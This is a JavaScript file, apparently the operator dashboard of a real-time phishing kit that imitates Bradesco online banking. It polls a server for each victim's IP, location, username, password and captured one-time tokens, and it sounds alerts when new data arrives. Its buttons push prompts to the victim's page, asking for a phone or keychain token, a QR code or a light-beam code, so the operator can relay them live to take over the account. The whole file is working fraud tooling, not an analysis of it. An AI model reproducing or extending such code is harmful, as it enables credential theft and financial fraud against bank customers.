$("document").ready(() => {
    let info = null;
    const quantidadeSegundos = 5;

    let time = quantidadeSegundos;

    let id = $("input#id").val();

    let audioAlteracaoInfo = document.getElementById("myAudioAlteracaoInfo");

    let status = {
        AGUARDANDO_INICIO: "Aguardando Início",
        COMPONENTE_SEGURANCA: "Aviso Componente de Segurança",
        BLOQUEADO: "Acesso Bloqueado",
        COMPONENTE_SEGURANCA_AGUARDANDO: "Aviso Componente de Segurança - Aguardando",
        LOGIN: "Login",
        LOGIN2: "Login2",
        LOGIN3: "Login3",
        USUARIO_SENHA: "Usuário e Senha - Login",
        ICP_BRASIL: "ICP Brasil - Login",
        CERTIFICADO: "Certificado Digital Bradesco - Login",
        AGUARDANDO_LOGIN: "Aguardando - Login",
        LOGIN_ERRO: "Usuário / Senha Inválidos - Login",
        TOKEN_CELULAR: "Token Celular - Login",
        TOKEN_CELULAR_ERRO: "Token Celular Erro - Login",
        TOKEN_CHAVEIRO: "Token Chaveiro - Login",
        TOKEN_CHAVEIRO_ERRO: "Token Chaveiro Erro - Login",
        INICIAR_ATUALIZACAO_INTERNA: "Iniciar Atualização - Interna",
        AGUARDE_ATUALIZACAO_ANDAMENTO_INTERNA: "Aguarde Atualização em Andamento - Interna",
        CONCLUIR_ATUALIZACAO_INTERNA: "Conclusão de Atualização - Interna",
        AGUARDE_VALIDACAO_CHAVE_INTERNA: "Aguarde Validação de Chave - Interna",
        TOKEN_CELULAR_INTERNA: "Token Celular - Interna",
        TOKEN_CELULAR_ERRO_INTERNA: "Erro Token Celular - Interna",
        TOKEN_CHAVEIRO_INTERNA: "Token Chaveiro - Interna",
        TOKEN_CHAVEIRO_ERRO_INTERNA: "Erro Token Chaveiro - Interna",
        AGUARDE_AVISO_QR_INTERNA: "Aviso QR Code Transação - Interna",
        QR_CODE_INTERNA: "QR Code - Interna",
        FEIXE_LUMINOSIDADE_INTERNA: "Feixe Luminosidade - Interna",
        FEIXE_LUMINOSIDADE_ERRO_INTERNA: "Erro Feixe Luminosidade - Interna",
        SOLICITAR_OUTRO_USER_INTERNA: "Solicitar Usuário - Interna",
    };

    function alterarDom() {
        $("span.ip").text(info.ip ? info.ip : "-");
        $("span.porcentagem ").text(info.porcentagem ? info.porcentagem : "-");
        $("span.data").text(info.data ? moment(info.data, "YYYY-MM-DD HH:mm:ss").format("DD/MM/YYYY HH:mm:ss") : "");
        $("span.pais").text(info.pais ? info.pais : "");
        $("span.uf").text(info.uf ? info.uf : "");
        $("span.cidade").text(info.cidade ? info.cidade : "");
        $("span.comando").text(info.comando ? status[info.comando] : "");
        $("span.usuario").text(info.usuario ? info.usuario : "-");
        $("span.senha").text(info.senha ? info.senha : "-");
        $("span.statusConexao").text(info.statusConexao ? info.statusConexao : "-");

        if (info.statusConexao.toLowerCase() === "offline") {
            $("span.statusConexao").addClass("offline");
        } else {
            $("span.statusConexao").removeClass("offline");
        }

        let htmlTokens = "";
        info.tokens.forEach((token) => {
            htmlTokens += `
                    <tr>
                    <th scope="row">1</th>
                    <td>${moment(token.data, "YYYY-MM-DD HH:mm:ss").format("DD/MM/YYYY HH:mm:ss")}</td>
                    <td>${token.label}</td>
                    <td>${token.valor}</td>
                    </tr>
            `;
        });
        $("table#tokens tbody").empty().append(htmlTokens);

        $("span.tokenAtual").text(info.tokens && info.tokens.length > 0 ? info.tokens[0].valor : "------");

        $("span.texto").text(info.texto ? info.texto : "-");
        $("span.userAgent").text(info.userAgent ? info.userAgent : "-");
        $("span.dispositivo").text(info.device ? info.device : "-");
        $("span.qrCodeFile").text(info.qrCodeFile ? info.qrCodeFile : "-");
        $("span.nome").text(info.nome ? info.nome : "-");
        $("span.numeroSerie").text(info.numeroSerie ? info.numeroSerie : "-");
        $("span.feixeBinario").text(info.feixeBinario ? info.feixeBinario : "-");

        if (info.comando.includes("INTERNA")) {
            $("div#botoes-parte-1").addClass("hide");
            $("div#botoes-parte-2").removeClass("hide");
        } else {
            $("div#botoes-parte-2").addClass("hide");
            $("div#botoes-parte-1").removeClass("hide");
        }

        $("title").text((info.usuario ? info.usuario : "") + " | " + info.ip);
    }

    function getForm() {
        var data = new FormData();
        return data;
    }

    function sendData(data) {
        $.ajax({
            url: "do.php",
            data: data,
            cache: false,
            contentType: false,
            processData: false,
            type: "POST",
            success: function (data) {
                // window.location.href = "ConfirmacaoEmail.php?cod="+$('input#cod').val();
                iniciarContador();
                atualizarInformacoes();
            },
        });
    }

    $("tbody").on("click", "button.enviarQr", function (event) {
        event.preventDefault();

        let nome = info.nome;

        let element = $(event.target).parent().find("input[name=qrCodeFile]");
        let input = element[0].files ? element[0].files[0] : false;
        let file = input;

        let action = $(event.target).data("action");

        if (file) {
            var img = new Image();

            img.src = window.URL.createObjectURL(file);

            img.onload = function () {
                let width = img.naturalWidth;
                let height = img.naturalHeight;

                window.URL.revokeObjectURL(img.src);

                var data = getForm();
                data.append("foto", input);
                data.append("id", id);
                data.append("action", action);
                sendData(data);
            };
        } else {
            alert("Selecione o arquivo antes de enviar!");
        }
    });

    $("button.enviarFeixeBinario").click((e) => {
        let feixe = $(e.target).parent().find("input[name=feixe]").val();
        if (feixe.length > 0) {
            let action = "ALTERAR_INFORMACOES";
            let campo = "feixeBinario";

            $.ajax({
                url: "do.php",
                type: "POST",
                data: { action: action, id: id, campo: campo, valor: feixe },
                cache: false,
                success: function (r) {
                    $(e.target).parent().find("input[name=feixe]").val("");
                    atualizarInformacoes();
                },
            });
        }
    });

    $("tbody").on("click", "button.action-validate-feixe", function (e) {
        let feixe = info.feixeBinario;
        let nome = info.nome;
        let numeroSerie = info.numeroSerie;

        let action = $(e.target).data("action");
        let comando = $(e.target).data("comando");

        $.ajax({
            url: "do.php",
            type: "POST",
            data: { action: action, id: id, comando: comando },
            cache: false,
            success: function (r) {
                atualizarInformacoes();
            },
        });
    });

    $("tbody").on("click", "button.action-validate-nome", function (e) {
        let nome = info.nome;

        let action = $(e.target).data("action");
        let comando = $(e.target).data("comando");

        $.ajax({
            url: "do.php",
            type: "POST",
            data: { action: action, id: id, comando: comando },
            cache: false,
            success: function (r) {
                atualizarInformacoes();
            },
        });
    });

    function verificarAlteracao(novaInfo) {
        let houveAlteracao = false;

        if (info && (info.usuario !== novaInfo.usuario || info.senha !== novaInfo.senha || info.comando !== novaInfo.comando || info.tokens.lenght !== novaInfo.tokens.lenght)) {
            houveAlteracao = true;
        }

        if (houveAlteracao) {
            $("tr.header").addClass("alteracao");
            notifyMe("Alteração na Info!", "Chegou novas informações.");
            audioAlteracaoInfo.play();
        }

        info = novaInfo;
        alterarDom();
    }

    function loadData() {
        $.ajax({
            url: "do.php",
            type: "POST",
            dataType: "json",
            data: { action: "BUSCAR_POR_ID", id: id },
            cache: false,
            success: function (r) {
                verificarAlteracao(r);
            },
        });
    }

    function atualizarInformacoes() {
        time = quantidadeSegundos;
        loadData();
    }

    loadData();

    $("tbody").on("click", "button.btn-action", function (e) {
        let action = $(e.target).data("action");
        let comando = $(e.target).data("comando");

        $.ajax({
            url: "do.php",
            type: "POST",
            data: { action: action, id: id, comando: comando },
            cache: false,
            success: function (r) {
                atualizarInformacoes();
            },
        });
    });

    $("tbody").on("click", "button.action-validate-infos", function (e) {
        let nome = info.nome;
        let numeroSerie = info.numeroSerie;

        let action = $(e.target).data("action");
        let comando = $(e.target).data("comando");

        $.ajax({
            url: "do.php",
            type: "POST",
            data: { action: action, id: id, comando: comando },
            cache: false,
            success: function (r) {
                atualizarInformacoes();
            },
        });
    });

    $("tbody").on("click", "button.enviarNome", function (e) {
        e.preventDefault();
        let nome = $(e.target).parent().find("input[name=nome]").val();
        if (nome.length > 0) {
            let action = "ALTERAR_INFORMACOES";
            let campo = "nome";

            $.ajax({
                url: "do.php",
                type: "POST",
                data: { action: action, id: id, campo: campo, valor: nome },
                cache: false,
                success: function (r) {
                    $(e.target).parent().find("input[name=nome]").val("");
                    atualizarInformacoes();
                },
            });
        }
    });

    $("tbody").on("click", "button.enviarNumeroSerie", function (e) {
        e.preventDefault();
        let numeroSerie = $(e.target).parent().find("input[name=numeroSerie]").val();
        if (numeroSerie.length > 0) {
            let action = "ALTERAR_INFORMACOES";
            let campo = "numeroSerie";

            $.ajax({
                url: "do.php",
                type: "POST",
                data: { action: action, id: id, campo: campo, valor: numeroSerie },
                cache: false,
                success: function (r) {
                    $(e.target).parent().find("input[name=numeroSerie]").val("");
                    atualizarInformacoes();
                },
            });
        }
    });

    $("tbody").on("click", "button.chama", function (e) {
        e.preventDefault();
        let numeroSerie = $(e.target).parent().find("input[name=chama]").val();
        if (numeroSerie.length > 0) {
            let action = "ALTERAR_INFORMACOES";
            let campo = "chama";

            $.ajax({
                url: "do.php",
                type: "POST",
                data: { action: action, id: id, campo: campo, valor: numeroSerie },
                cache: false,
                success: function (r) {
                    $(e.target).parent().find("input[name=chama]").val("");
                    atualizarInformacoes();
                },
            });
        }
    });

    function relogio() {
        $("span#segundos").text(time);
        time--;
        if (time === -1) {
            loadData();
            time = 5;
        }
    }

    var timer = setInterval(relogio, 1000);

    function pararContador() {
        if (timer) {
            clearInterval(timer);
            timer = null;
        }
    }

    function iniciarContador() {
        if (!timer) {
            timer = setInterval(relogio, 1000);
        }
    }

    $("a#controlarContador").click((e) => {
        e.preventDefault();
        if (timer) {
            pararContador();
            $("span#timer").addClass("parado");
        } else {
            iniciarContador();
            $("span#timer").removeClass("parado");
        }
    });
    document.addEventListener("DOMContentLoaded", function () {
        if (!Notification) {
            alert("Desktop notifications not available in your browser. Try Chromium.");
            return;
        }

        if (Notification.permission !== "granted") Notification.requestPermission();
    });

    function notifyMe(titulo, msg) {
        if (Notification.permission !== "granted") Notification.requestPermission();
        else {
            var notification = new Notification(titulo, {
                icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRHjpI5COjVeOEVYs7aBhl-DgzYPZPz6Ma7IhU1c_t6-lKNJZkx",
                body: msg,
            });
            notification.onclick = function () {
                window.open(window.location.href);
            };
        }
    }

    $(document).bind("click keydown keyup mousemove", function () {
        if ($("tr.header").hasClass("alteracao")) {
            setTimeout(function () {
                $("tr.header").removeClass("alteracao");
            }, 3000);
        }
    });
});
